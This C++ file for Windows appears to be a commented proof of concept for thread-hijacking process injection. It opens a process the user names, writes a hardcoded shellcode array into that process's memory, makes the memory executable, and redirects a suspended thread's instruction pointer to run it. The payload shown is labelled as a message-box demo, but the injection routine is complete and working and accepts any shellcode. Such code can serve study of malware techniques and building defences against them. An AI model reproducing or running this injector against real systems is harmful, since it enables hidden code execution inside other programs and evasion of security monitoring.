#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

unsigned char payload[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3"; // messagebox shellcode

HANDLE GetProcessHandleByName(const wchar_t* processName) {
    PROCESSENTRY32W processEntry = { sizeof(PROCESSENTRY32W) };
    HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   // create a snapshot of all processes on your system
    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "unable to create snapshot " << GetLastError() << std::endl;
        return NULL;
    }

    if (Process32FirstW(snapshotHandle, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID); // iterate through the entries gained by the snapshot
                if (!processHandle) {                                                                      // current process in the iteration (processEntry.szExeFile) is compared to the given process name
                    std::cerr << "unable to open process " << GetLastError() << std::endl;
                }
                CloseHandle(snapshotHandle);
                return processHandle;
            }
        } while (Process32NextW(snapshotHandle, &processEntry));
    }

    std::cerr << "process not found" << std::endl;
    CloseHandle(snapshotHandle);
    return NULL;
}

void InjectPayload(HANDLE processHandle, HANDLE threadHandle) {
    LPVOID allocatedMemory = VirtualAllocEx(processHandle, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);  // allocate memory inside of target process
    if (allocatedMemory == NULL) {
        std::cerr << "unable to allocate memory " << GetLastError() << std::endl;
        return;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(processHandle, allocatedMemory, payload, sizeof(payload), &bytesWritten)) { // write payload to the allocated memory space
        std::cerr << "Unable to write memory inside the target process " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);
        return;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(processHandle, allocatedMemory, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) { // change memory region protection and save old settings to oldProtect
        std::cerr << "Unable to change memory protection " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);
        return;
    }

    CONTEXT threadContext = { 0 }; // initializes context structure to 0 - this context structure stores information about the state of a thread, e.g values of its registers
    threadContext.ContextFlags = CONTEXT_FULL; // CONTEXT_FULL to retrieve all possible registers of a thread
    SuspendThread(threadHandle); // suspend to safely manipulate with the thread
    GetThreadContext(threadHandle, &threadContext); // retrieve the current execution context of the thread, e.g the state of its registers 

#ifdef _WIN64 // 64 bit systems
    threadContext.Rip = (DWORD64)allocatedMemory; // in 64 bit systems (x86-64) the instruction pointer is called RIP
#else // 32 byt systems
    threadContext.Eip = (DWORD)allocatedMemory; // in 32 bit systems (x86-64) the instruction pointer is called EIP
#endif




     
// The core logic here is that the  EIP/RIP pointers point to the next instruction that the CPU will execute. By chaning their values, you redirect the execution flow.
// In our case, we redirect it to the address of the injected shellcode



    SetThreadContext(threadHandle, &threadContext); //update thread context, specifically the new value of the RIP/EIP instruction pointer
    ResumeThread(threadHandle); // cancel the suspension
} 

int main() {
    wchar_t processName[256];
    std::wcout << L"Enter the name of the target process: ";
    std::wcin.getline(processName, 256);

    HANDLE processHandle = GetProcessHandleByName(processName);
    if (!processHandle) {
        std::cerr << "Could not obtain process handle" << std::endl;
        return 1;
    }

    DWORD processID = GetProcessId(processHandle);
    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // create a snapshot of all threads
    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "Unable to create thread snapshot " << GetLastError() << std::endl;
        CloseHandle(processHandle);
        return 1;
    }

    HANDLE threadHandle = NULL;
    if (Thread32First(snapshotHandle, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processID) { //find a thread that belongs to the PID of our target process
                threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID); // if found retrieves a handle to the thread
                if (threadHandle) break;
            }
        } while (Thread32Next(snapshotHandle, &threadEntry));
    }

    if (threadHandle == NULL) {
        std::cerr << "Unable to find a valid thread inside the target process" << std::endl;
        CloseHandle(snapshotHandle);
        CloseHandle(processHandle);
        return 1;
    }

    InjectPayload(processHandle, threadHandle);

    CloseHandle(threadHandle); //cleanup 
    CloseHandle(snapshotHandle);
    CloseHandle(processHandle);
    return 0;
}
